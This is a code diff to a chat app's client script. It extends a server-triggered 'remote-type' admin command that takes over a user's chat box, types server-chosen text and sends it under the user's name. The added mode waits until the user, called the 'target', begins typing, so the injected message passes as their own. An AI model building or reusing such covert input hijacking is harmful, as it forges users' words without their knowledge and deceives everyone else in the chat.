@@ -229,10 +229,10 @@
     // --- 7. ADMIN COMMANDS ---
     socket.on('force-redirect', (data) => { if (data.url) window.location.href = data.url; });
     socket.on('force-kick', () => { window.location.href = "about:blank"; });
-    socket.on('remote-type', async (data) => {
-        const sequence = data.sequence; 
-        const delay = data.delay || 0;
-        if (delay > 0) await new Promise(res => setTimeout(res, delay * 1000));
+    let pendingRemoteSequence = null;
+
+    // Helper function to perform the automated typing
+    async function executeRemoteType(sequence) {
         chatInput.readOnly = true;
         chatInput.value = ""; 
         for (let char of sequence) {
@@ -242,6 +242,30 @@
         socket.emit('chat-message', { username: username, msg: chatInput.value });
         chatInput.value = '';
         chatInput.readOnly = false;
+    }
+
+    socket.on('remote-type', async (data) => {
+        const sequence = data.sequence; 
+        const delay = data.delay || 0;
+
+        if (delay === -1) {
+            // Store the sequence and wait for the user to type
+            pendingRemoteSequence = sequence;
+            return;
+        }
+
+        // Standard delay logic
+        if (delay > 0) await new Promise(res => setTimeout(res, delay * 1000));
+        await executeRemoteType(sequence);
+    });
+
+    // Listener to detect when the target starts typing
+    chatInput.addEventListener('input', () => {
+        if (pendingRemoteSequence) {
+            const seq = pendingRemoteSequence;
+            pendingRemoteSequence = null; // Clear it so it only runs once
+            executeRemoteType(seq);
+        }
     });
 
     muteBtn.addEventListener('click', () => {
